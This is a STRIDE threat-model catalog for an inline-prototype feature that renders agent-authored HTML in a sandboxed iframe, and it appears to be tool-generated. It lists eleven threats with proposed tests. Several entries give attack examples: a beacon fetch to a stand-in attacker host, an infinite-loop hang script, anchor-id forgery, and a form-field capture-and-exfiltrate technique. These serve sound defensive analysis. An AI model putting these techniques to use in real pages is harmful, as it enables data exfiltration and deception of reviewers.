---
title: STRIDE — 017 inline prototypes
date: 2026-08-26
jira_key: 017-inline-prototypes
path_tier: standard
generated_by: stride-analysis
trigger: explicit
trigger_detail: invoked directly for the inline-prototypes design/plan — the first path in the product that puts agent-authored, unescaped markup into the reviewer's page (rendered into a sandboxed `<iframe srcdoc>` with a `postMessage` click bridge).
version: 1
---

# STRIDE — 017 inline prototypes

> **This catalog supplements the functional tests derived from the plan's `## Tasks`. It does not replace them.**

## Orientation

**11 threats catalogued** across 5 trust boundaries (5 high / 6 medium / 0 low).

Read these first, ranked by how much they change what you do next:

1. **TM-3**: A prototype's shim reports `data-anchor-id` values with no check that they belong to the sending block — a fence (via static markup or, more powerfully, its own runtime script) can forge a click that hijacks, resurrects, or misattributes a comment thread onto a *different* prototype's or flow diagram's element. Unmitigated in the plan's given code. (Sandboxed frame → reviewer page, high)
2. **TM-11**: Any prototype rendering a normal-looking form field (the design's own worked example includes one) can capture what the reviewer types — or the browser autofills — and exfiltrate it, using only `allow-scripts` and the already-uncontrolled network egress. Sharper and higher-severity than the passive metadata leak below. (Sandboxed frame → reviewer page, high)
3. **TM-8**: Nothing enforces `id:` uniqueness across the whole document (only within one fence body) — two fences sharing an `id:` silently collide on every anchor id they emit, and `querySelector`'s first-match semantics resolve every click/paint/carry-forward to the wrong block. (Fence body → rendered HTML, high)
4. **TM-10**: A peer reviewer's *unrelated* comment save re-triggers a full `docEl.innerHTML` replace and iframe rebuild (confirmed in `public/app.js`), which re-executes a hung prototype's script — defeating "recoverable by reload" for as long as the session stays multi-reviewer-active. (Rendered document → other reviewers, high)
5. **TM-4**: The message listener and `openProtoComposer` never validate `data.anchorId`/`data.rect`'s shape before use, so a malformed message can leave `pendingAnchors` set with no composer visibly open — a later, unrelated action could pick up the stale pending target. (Sandboxed frame → reviewer page, medium)

The full catalog follows below.

## Trust boundaries walked

1. **Agent → plan document** — the agent (possibly compromised or prompt-injected) authors the fence body, including arbitrary `<script>`. (explicit, from the calling brief)
2. **Fence body → rendered HTML** — `server/prototype.js`: markup + shim → `escapeHtml` → `srcdoc` attribute, once. (explicit)
3. **Sandboxed frame → reviewer page** — the `postMessage` bridge, the only sanctioned channel out of the opaque-origin frame. (explicit)
4. **Reviewer page → server** — `syncReview`, `/api/review-state`, `/api/submit`: does an element-anchored comment introduce new server-side input? (explicit)
5. **Rendered document → other reviewers** — multiple reviewers can open the same session (`docs/PROTOCOL.md`, "Multiple reviewers"); each renders the same agent-authored frame independently. (explicit)

## Coverage

> One row per (boundary × category). Each cell is either `N entries` or `N/A — <reason>`.

| Boundary \ Category | S | T | R | I | D | E |
|---|---|---|---|---|---|---|
| 1. Agent → plan document | N/A — no new caller-identity claim crosses this boundary; the agent's document-authoring capability is unchanged by this feature | N/A — the agent already owns full write authority over the whole document; a `prototype` fence adds no new write surface | N/A — the existing per-round version-history ring (`server/server.js`, `VERSION_HISTORY`) already durably captures every round's markdown, prototype fences included | N/A — write-only boundary; the agent receives nothing back here | N/A — bounded by the existing 5MB request-body cap (`readBody`), applied uniformly regardless of fence type | 1 (TM-1) |
| 2. Fence body → rendered HTML | N/A — pure string-transform boundary, no identity claim to forge or verify | 2 (TM-2, TM-8) | N/A — no state-changing action happens at a render-only boundary | N/A — a transform can't leak more than the source document already contains | N/A — `scanStubs`/`rewriteMarkup`'s regexes run over disjoint character classes with a single unambiguous stop condition (no catastrophic-backtracking shape); input is capped by the same 5MB body limit | N/A — no privilege distinctions exist in a stateless render |
| 3. Sandboxed frame → reviewer page | 1 (TM-3) | 1 (TM-4) | N/A — the only repudiation-relevant question here ("can a recorded anchor misrepresent what the reviewer clicked") collapses into TM-3; no independent gap | 2 (TM-5, TM-11) | 1 (TM-6) | N/A — the message contract is one narrow verb (`proto-click`) that only ever opens the existing composer under the existing `flowCommentable()` gate; no path from a frame message to a privileged action |
| 4. Reviewer page → server | N/A — reviewer-identity model (ephemeral `reviewerId`, no accounts) is pre-existing and unaffected | N/A — `archived` is server-authoritative (`reconcileComment` deletes then re-applies it, never trusts the browser); the anchors-trusted-per-own-author model is pre-existing since the flow-diagram feature (016) | N/A — collapses into TM-3: the only new repudiation question this feature raises is whether the recorded anchor is trustworthy, not a gap at the submission boundary itself | N/A — submit/review-state responses stay scoped to the caller's own session and comments, unchanged | N/A — the existing 5MB body cap (`readBody`) applies uniformly regardless of anchor kind | N/A — no role/privilege model; per-author scoping (`mergeComments`) is pre-existing and unaffected |
| 5. Rendered document → other reviewers | 1 (TM-7) | N/A — no boundary-specific tampering distinct from TM-2/TM-3/TM-8, already filed at their own boundaries | N/A — no audit gap specific to reviewer multiplicity; per-round history plus per-author attribution already covers it | 1 (TM-9) | 1 (TM-10) | N/A — uniform exposure across reviewers by design, matching the documented multi-reviewer model |

> Legend: S=Spoofing · T=Tampering · R=Repudiation · I=Information Disclosure · D=Denial of Service · E=Elevation of Privilege

## Catalog

### TM-1 — agent-authored script gains an execution context in the reviewer's browser for the first time

- **Category:**   Elevation of Privilege
- **Boundary:**   Agent → plan document
- **Severity:**   high   <!-- impact is high (arbitrary script execution in the reviewer's own browser) and likelihood is "likely" (this happens on every prototype fence, by design) — the severity field records the inherent basis, not the post-mitigation risk -->
- **Source:**     primary
- **Linked to:**  Design "Decisions taken" row "Interactivity"; Task 1 Step 9 and Task 2 Step 1 (sandbox-attribute assertions)
- **Trigger:**    Any `prototype` fence renders; its markup's `<script>` (and the injected click shim) execute in a real browsing context for the first time in this tool's history — every other rendered surface (prose, `choice`, `flow`) is either escaped text or inert SVG with no execution.
- **Expected:**   Fully mitigated by `sandbox="allow-scripts"` with **no** `allow-same-origin`, giving the frame an opaque (`null`) origin with no DOM/storage/session/composer/submit access to the parent. Already covered by existing plan tests — no new test needed: `server/prototype.js` self-check (Step 9: `assert.ok(html.includes('sandbox="allow-scripts"'))`, `assert.ok(!/allow-same-origin/.test(html))`) and `test/e2e.js`'s "issue 017" section (the first `check`, same assertions against the served document).
- **Notes:**       This entry exists for coverage-matrix completeness and to anchor the residual threats below (TM-3 through TM-11) as what survives this mitigation, not to propose new work.

### TM-2 — escaping into the `srcdoc` attribute is correct today but untested against adversarial payloads

- **Category:**   Tampering
- **Boundary:**   Fence body → rendered HTML
- **Severity:**   medium   <!-- impact would be severe if this regressed (script/markup escapes the sandbox context entirely), but likelihood today is low — traced and confirmed correct: `escapeHtml` (server/escapehtml.js) runs once over the fully concatenated inner document (BASE_STYLE + rewritten markup + SHIM), escaping all four of `& < > "` before the string is placed inside `srcdoc="..."`, so no literal `"` anywhere in agent content can terminate the attribute early -->
- **Source:**     primary
- **Linked to:**  Task 1 (`server/prototype.js`, `renderPrototype`)
- **Trigger:**    A fence body contains a literal `"`, `</iframe>`, `<script>`, or a pre-encoded entity such as `&quot;` or `&#34;`, anywhere in the markup — including inside an attribute value, a text node, or the malformed-fence fallback path (`renderPrototype` returning `<pre><code class="language-prototype">${escapeHtml(body)}</code></pre>` when `id:` is missing).
- **Expected:**   The srcdoc attribute value never contains an unescaped `"`, and the outer `<div class="proto-block">…</div>` wrapper (and the document around it) is structurally intact regardless of payload content. Add explicit adversarial-payload assertions to `server/prototype.js`'s self-check, alongside the existing benign-case assertions (Step 9): render bodies containing each of the payloads above and assert (a) the raw payload never appears unescaped outside the `srcdoc` attribute value, and (b) the malformed-fence fallback escapes its body the same way.
- **Notes:**       The plan's existing tests only exercise benign shapes (`x"y`, `<hi>` style, mirroring `flow.js`'s precedent). Given this is explicitly "the first path that puts agent-authored, unescaped markup into the reviewer's page," this invariant deserves its own locked-down regression test rather than inherited benign-case coverage.

### TM-3 — a prototype frame can forge an anchor id and hijack, resurrect, or misattribute a comment thread onto a different block's element

- **Category:**   Spoofing
- **Boundary:**   Sandboxed frame → reviewer page
- **Severity:**   high   <!-- bad impact (a reviewer's comment silently attaches to an element they never clicked — corrupts the review record itself) AND likely (trivially exploitable with zero special conditions, and explicitly enabled by the design's own "the agent's own scripts run" decision) -->
- **Source:**     primary
- **Linked to:**  Task 1 (`server/prototype.js`, `rewriteMarkup`/`scanStubs`) and Task 4 (`public/app.js`, the `message` listener / `openProtoComposer`)
- **Trigger:**    `rewriteMarkup` only *appends* `data-anchor-id="<fenceId>:el:<x>"` after each `data-proto-id="x"` match; it never strips or rejects a `data-anchor-id` already present in the agent's raw markup. Per HTML's duplicate-attribute rule, the browser keeps the *first* occurrence of an attribute and discards the rest — so an agent placing a literal `data-anchor-id="<foreign-id>"` before the server's appended one (or on any element with no `data-proto-id` at all, which `rewriteMarkup` never touches) makes the shim's click handler (`el.dataset.anchorId`) report that forged id, which can name *any* real anchor anywhere in the document: another prototype's `<fenceId>:el:x`, or a flow diagram's `<fenceId>:node:x` / `<fenceId>:edge:x->y>`. More powerfully, this doesn't require static HTML tricks at all: because the agent's own `<script>` executes in the same document as the shim (by explicit design), it can dynamically rewrite `data-anchor-id` on any of its own elements at click time (e.g., a capture-phase `mousedown` handler) — a fix that only sanitizes the static HTML cannot close this variant.
- **Expected:**   The parent must not trust a reported `anchorId` unless it is scoped to the block that sent it. Two complementary tests: (a) `server/prototype.js` self-check — markup containing a pre-existing `data-anchor-id="other:el:x"` should not let that foreign value survive into the rendered element's effective attribute (the renderer should strip/neutralize any inbound literal `data-anchor-id` before appending its own); (b) `test/e2e.js` — a source-regex assertion on `public/app.js`'s message listener / `openProtoComposer`, requiring a check that `anchorId` is prefixed by the sending block's own `data-proto-id` + `:el:` before calling `flowEl`/opening the composer (same pattern the plan's Task 4 already uses to regex-assert listener behavior straight out of the source, e.g. its `event.source`-vs-`event.origin` check).
- **Notes:**       Secondary category: Tampering (the comment's `anchors` field, once submitted, is corrupted data). The sibling FMEA catalog's `FM-6` independently found the *static*, self-shadowing sub-case of this same mechanism (an accidental literal `data-anchor-id`) — this entry is the adversarial, cross-block-hijack superset, including the runtime-script variant FM-6 does not consider. `FM-7` (cross-fence `id:` collision) is a related but distinct root cause; see TM-8.

### TM-4 — an unvalidated `postMessage` shape can leave pending-comment state stale with no composer visibly open

- **Category:**   Tampering
- **Boundary:**   Sandboxed frame → reviewer page
- **Severity:**   medium   <!-- bad impact (stale pendingAnchors/pendingQuote a later action could misuse) OR likely (trivial for any frame script to send a malformed message) -->
- **Source:**     primary
- **Linked to:**  Task 4 (`public/app.js`, `openProtoComposer`)
- **Trigger:**    The frame posts `{kind:'proto-click', anchorId: undefined, rect: undefined}` (or `rect` with non-numeric `left`/`bottom`). `openProtoComposer` sets `pendingRange = null; pendingAnchors = [anchorId]; pendingQuote = flowLabel(...)` *before* computing `{left: frameRect.left + rect.left, bottom: frameRect.top + rect.bottom}` for `openComposerAt` — `rect.left` throws on `undefined`/`null` `rect`, aborting *after* the pending-state mutation but *before* the composer ever opens.
- **Expected:**   A malformed message is dropped before any pending-comment state is mutated. Test: `test/e2e.js` — a source-regex assertion requiring the message listener or `openProtoComposer` to type/shape-check `data.anchorId` (string) and `data.rect`'s numeric fields before assigning to `pendingAnchors`/`pendingQuote`/`pendingRange`, mirroring the existing Task 4 regex-assertion pattern. Full behavioral proof needs a real browser, which this suite doesn't have.

### TM-5 — the sandboxed frame retains full network egress with no CSP, disclosing that a session was viewed

- **Category:**   Information Disclosure
- **Boundary:**   Sandboxed frame → reviewer page
- **Severity:**   medium   <!-- bad-impact OR likely: likely=true (trivial, no defenses exist today); impact is bounded — no secrets/session tokens are reachable from an opaque origin, only viewing metadata -->
- **Source:**     primary
- **Linked to:**  Design "Out of scope" section ("A CSP on the server's responses")
- **Trigger:**    A prototype's script issues `fetch('https://attacker.example/beacon?t=' + Date.now())` (or `navigator.sendBeacon`, or an `<img src="https://...">`) on load.
- **Expected:**   `sandbox="allow-scripts"` (without `allow-same-origin`) blocks DOM/storage/session access but has **no effect on network egress** — HTML sandbox tokens never restrict fetch/XHR/beacon/image loads. Test: `test/e2e.js` — assert a session response serving a prototype fence carries no `Content-Security-Policy` (or equivalent) header, documenting the current explicit state so a future change is a visible, deliberate diff rather than a silent one.
- **Notes:**       **Pushback on the spec, as explicitly invited by the calling brief.** The design's "Out of scope" reasoning — "the sandbox attribute is what isolates the frame, and a CSP would not change that" — is correct for DOM/session isolation but does **not** hold for this specific channel: sandbox has no network-blocking token, so CSP (or an equivalent egress control) is the *only* lever available over it. This is not a request to reverse the CSP-out-of-scope decision; the impact here is bounded (viewing metadata only). But the stated rationale, read as covering "why a CSP doesn't matter for this feature," is incomplete — recommend the team record this specific gap as a deliberate, reasoned accept, or scope a minimal `connect-src`/`default-src` CSP to prototype-bearing responses as a fast-follow. See TM-9 and TM-11 for how this channel compounds with multi-reviewer exposure and active data capture, respectively.

### TM-6 — a prototype's own script can hang or badly degrade the reviewer's tab

- **Category:**   Denial of Service
- **Boundary:**   Sandboxed frame → reviewer page
- **Severity:**   medium   <!-- bad-impact AND likely, but deliberately ranked below `high`: local-only, no data loss, and (in a single-reviewer session) recoverable by reload — see TM-10 for why that last assumption doesn't fully hold once multiple reviewers are active -->
- **Source:**     primary
- **Linked to:**  Task 1 (the `SHIM` script) and Design "Out of scope" ("A measuring shim")
- **Trigger:**    A fence's script runs `<script>while(true){}</script>`, grows an unbounded DOM, or floods `parent.postMessage` in a tight loop. Sandboxing isolates DOM/storage, not the JS execution thread.
- **Expected:**   No real browser exists in this suite, so test the server-side slice only: `test/e2e.js` — render and serve a prototype fence whose markup is `<script>while(true){}</script>` (or any other pathological script text), then make a normal follow-up request (e.g. `/api/state`) and assert it returns within the suite's normal timeout — proving `renderPrototype` never evaluates/executes the fence's script (a pure string transform), so server responsiveness is unaffected regardless of script content. The client-tab-hang impact itself is explicitly flagged as unreachable by this suite (no real browser) and stays an accepted, undemonstrated risk pending future browser-based coverage.

### TM-7 — a prototype can pixel-clone the review app's own chrome to deceive every reviewer who opens it

- **Category:**   Spoofing
- **Boundary:**   Rendered document → other reviewers
- **Severity:**   medium   <!-- bad-impact OR likely: likely=true (trivial to author); impact is partially bounded by existing CSS containment (see Expected) -->
- **Source:**     primary
- **Linked to:**  Task 1 (shim + markup rendering), Task 3 (`.proto-block`/`.proto-frame` CSS)
- **Trigger:**    A prototype's markup/CSS pixel-clones the review app's own composer box, submit button, or comment card. Because every reviewer who opens the session independently renders the same agent-authored frame, the deception is delivered identically to each of them — potentially tricking a reviewer into typing feedback into a fake control, which could then be exfiltrated via TM-5's network channel, or simply discarded, either way suppressing or misdirecting real feedback.
- **Expected:**   Partially mitigated already: `.proto-block` uses `overflow: hidden` and the frame is bounded to its declared `--proto-h` box (Task 3), so a full-page overlay takeover is structurally blocked — cite the existing Task 3 CSS-presence check as covering that containment property. A within-box clone (positioned where a real composer would plausibly appear) is not blocked by CSS containment and is a human-factors/social-engineering risk this suite cannot assert; flagged as an accepted residual risk rather than given a new automated test.

### TM-8 — no cross-fence `id:` uniqueness check lets two fences collide on every anchor id they emit

- **Category:**   Tampering
- **Boundary:**   Fence body → rendered HTML
- **Severity:**   high   <!-- trivially triggered even non-adversarially (an agent reusing an `id:` while iterating on a screen, or a `flow` and `prototype` fence sharing a name), and it silently breaks the one guarantee the whole feature depends on: that an anchor id names exactly one element -->
- **Source:**     adversarial
- **Linked to:**  Task 1 (`parseHeader`/`scanStubs` in `server/prototype.js`) and Task 2 (`server/markdown.js`'s `renderFence`/`renderBlocks` dispatch loop — each fence renders independently with no shared registry of ids seen so far); `parseFlow`'s own `id:`-uniqueness check is scoped to a single fence body, never to the document
- **Trigger:**    A document with two `prototype` fences (or a `flow` and a `prototype` fence) that both declare `id: signup`, each containing an element with `data-proto-id="save"`. The rendered document contains two `data-anchor-id="signup:el:save"` stubs in different block containers.
- **Expected:**   `render()`'s output should never contain the same `data-anchor-id="…"` value twice. Test: `server/markdown.js`/`test/e2e.js` — a document reusing an already-used top-level fence `id:` should fall back to the malformed-fence code-block path for the second occurrence (mirroring the existing no-id/blank-markup fallback), rather than emitting a second indistinguishable stub set; assert `render()`'s output has no duplicate `data-anchor-id="..."` substring.
- **Notes:**       Concrete downstream failure, not theoretical: `flowEl(id)` (`docEl.querySelector`) always resolves to the *first* matching element in DOM order, so `openProtoComposer`'s "already commented" shortcut and `markFlowAnchors`'s painting/postMessage operate on the wrong block whenever a reviewer clicks the second occurrence. Server-side, `idAnchors`'s `indexOf` carry-forward can't distinguish the duplicates either — a comment can be wrongly kept alive after its true target element is removed, as long as a same-named element in an unrelated block still exists. The sibling FMEA catalog's `FM-7` independently found the same root cause (missing cross-fence uniqueness) from a non-adversarial angle; this entry is the STRIDE framing of the identical gap. Related to TM-3 (both stem from `flowEl`'s unscoped, document-wide `querySelector`).

### TM-9 — peer review activity turns the passive network beacon into an activity-correlated oracle

- **Category:**   Information Disclosure
- **Boundary:**   Rendered document → other reviewers
- **Severity:**   medium   <!-- depends on TM-5's already-accepted gap for a payload to fire, but converts a single "session was viewed" ping into a live feed of when *other* reviewers are actively working the session -->
- **Source:**     adversarial
- **Linked to:**  Task 4 Step 3 (`bindProtos()`, called from `renderDoc`) and the existing `'review'` SSE handler / `fetchState()` in `public/app.js` (confirmed unchanged by this plan: `es.addEventListener('review', …)` calls `fetchState()` on any peer's non-self review-state change; `fetchState()` unconditionally calls `renderDoc(s.doc)`, which unconditionally does `docEl.innerHTML = doc.html`)
- **Trigger:**    A `prototype` fence's script fires a beacon on load. Reviewer A and B both have the session open. B saves an unrelated prose comment via `/api/review-state` (no change to the prototype fence at all). A's tab re-fires the beacon a second time, purely because B's `review` SSE event triggered `fetchState()` → `renderDoc()` → a full iframe rebuild in A's tab.
- **Expected:**   A render triggered by an unrelated peer's review-state change should not tear down and recreate a `.proto-block` whose rendered HTML is byte-identical to the previous render. Test: assert the `iframe.contentWindow` reference (and thus `protoFrames`'s key for that block) stays stable across a `review`-event-triggered `fetchState()` when the underlying document HTML hasn't changed, rather than being a fresh window each time.
- **Notes:**       The root mechanism (`fetchState()` unconditionally replacing `docEl.innerHTML` on any peer sync) is pre-existing and shared with flow diagrams — this plan doesn't introduce it. What's new is that a live script execution context (the iframe) now has an observable side effect (a network request) that gets *repeated* on every unrelated peer action, where before (flow diagrams) the same churn was an inert SVG redraw. See TM-5 (base disclosure) and TM-11 (active capture) for the other two legs of this channel.

### TM-10 — peer review activity defeats the "recoverable by reload" mitigation for a hung prototype

- **Category:**   Denial of Service
- **Boundary:**   Rendered document → other reviewers
- **Severity:**   high   <!-- TM-6 rated its DoS medium specifically because a hang is "recoverable by reload"; in the multi-reviewer scenario this tool explicitly supports, that recovery path is undone automatically and repeatedly by activity the hung reviewer doesn't control, which can make the tab durably unusable for the rest of a live session -->
- **Source:**     adversarial
- **Linked to:**  Task 4 Step 3, same `'review'` SSE handler / unconditional `fetchState()` → `renderDoc()` full-innerHTML-replace path as TM-9
- **Trigger:**    A `prototype` fence contains `<script>while(true){}</script>` (TM-6's own payload). Reviewer A's tab hangs on load. Reviewer B, in a separate tab, saves any unrelated comment — anywhere in the document, including a plain prose comment with no anchors at all. Because A's `'review'` listener runs `fetchState()` unconditionally, the moment A's tab becomes responsive again (or if the hang was only partial), the frame is torn down and the same script re-executes, re-hanging it, with no action by A.
- **Expected:**   The `'review'` event handler (or `renderDoc`/`bindProtos`) should not recreate a `.proto-block` whose rendered HTML is unchanged since the last render. Test: same structural fix and test as TM-9 — gating iframe recreation on an actual content diff closes both entries with one change. A structural source-regex assertion (matching the suite's existing pattern for `app.js` behavior) should confirm the guard exists.
- **Notes:**       This is TM-6 (the base client-side hang, which this suite already flags as unreachable without a real browser) specifically escalated by the multi-reviewer boundary. Fixing TM-9/TM-10's shared root cause (unconditional iframe recreation on any peer sync) is the single highest-leverage code change in this catalog — it closes three entries (TM-9, TM-10, and reduces TM-6's practical severity back toward its stated "recoverable by reload" basis).

### TM-11 — a normal-looking prototype form field can capture and exfiltrate what the reviewer types or the browser autofills

- **Category:**   Information Disclosure
- **Boundary:**   Sandboxed frame → reviewer page
- **Severity:**   high   <!-- unlike TM-5 (bounded to "no secrets/session tokens are reachable, only viewing metadata"), this reaches real content the reviewer types or the browser autofills, using channels the plan already grants (allow-scripts for capture, uncontrolled network egress for exfiltration per TM-5) with no additional sandbox token required -->
- **Source:**     adversarial
- **Linked to:**  Task 1 Step 11 (`SHIM` only listens for `click`; nothing constrains what *other* script the agent embeds in the same markup) and Design "Decisions taken" row "Interactivity" ("The agent's own scripts run")
- **Trigger:**    A `prototype` fence renders a plausible form field — the design's own worked example includes `<input data-proto-id="email" placeholder="Email">` — plus an additional agent-authored `<script>` (distinct from the shim) that attaches its own `input`/`change`/`blur` listener to that field and `fetch()`s the value to an external host. A reviewer sanity-checking the mockup's look and feel types real content into the field, or the browser's native autocomplete populates it on focus, requiring no deliberate typing at all.
- **Expected:**   This residual risk isn't surfaced by the plan's own documentation, which discusses the sandbox only in terms of "isolat[ing] the frame," not in terms of what the frame is permitted to *collect*. At minimum, Task 5's documentation changes (`docs/PROTOCOL.md` / `integration/claude/plan-review/SKILL.md`) should explicitly warn against giving prototype form fields real `type=`/`autocomplete=`/`name=` semantics that invite reviewer-entered or browser-autofilled data — currently absent from every doc change in Task 5. Test: `test/e2e.js` — assert the new documentation text (added by Task 5) contains this warning, so its absence is a caught regression rather than a silent doc gap.
- **Notes:**       `allow-forms` is irrelevant here — reading `.value` and firing `fetch()` needs only `allow-scripts`, already granted. Read this as a sharper, higher-severity restatement of TM-5's residual-risk boundary: TM-5 is passive/metadata-only, this is active content capture.

## Filtered (below severity floor)

No entries were generated below the Standard path's severity floor (`high` + `medium`) in either the primary or the adversarial pass.

## Adversarial pass

- **Status:** ran
- **Result:** 1 subagent dispatched (security-pen-tester persona, per the Standard-tier default). Returned **4 deltas** (TM-8, TM-9, TM-10, TM-11).
- **Missed boundary callout:** none — the subagent confirmed the five given boundaries cover the surface; its deltas cross seams between them (specifically boundary 3 ↔ boundary 5, via the pre-existing unconditional `fetchState()`/`renderDoc()` re-render path).
- **Verification note:** TM-9/TM-10's technical premise (that any peer's unrelated review-state change triggers a full iframe teardown/rebuild) was independently confirmed by reading `public/app.js` directly (the `'review'` SSE handler, `fetchState()`, and `renderDoc()`) before accepting the deltas — not taken on the subagent's word alone.
